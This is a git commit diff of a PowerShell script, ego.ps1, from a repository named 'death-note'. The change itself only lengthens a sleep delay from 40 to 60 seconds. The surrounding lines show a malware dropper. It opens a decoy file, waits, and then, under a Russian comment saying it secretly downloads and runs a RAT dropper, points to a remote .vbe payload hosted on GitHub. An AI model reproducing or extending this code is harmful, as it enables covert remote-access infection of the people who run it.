15a56f178f667ce5a680fcc4a8dd01c5d088487c
andezzzWW <andezzzww@gmail.com>
2025-10-20 21:16:15 +0300

    Update ego.ps1

--- ego.ps1
+++ ego.ps1
@@ -54,7 +54,7 @@ $content | Out-File -FilePath $filePath -Encoding UTF8
 Invoke-Item $filePath
 
 # ЗАДЕРЖКА
-Start-Sleep -Seconds 40
+Start-Sleep -Seconds 60
 
 # СКРЫТО СКАЧИВАЕМ И ЗАПУСКАЕМ ПЕРЕНОСЧИК RAT
 $Url = "https://github.com/andezzzWW/death-note/raw/refs/heads/main/SCRRC4ryuk.vbe"
@@ -75,5 +75,6 @@ try {
 catch {
 	
 }
+
 
 exit
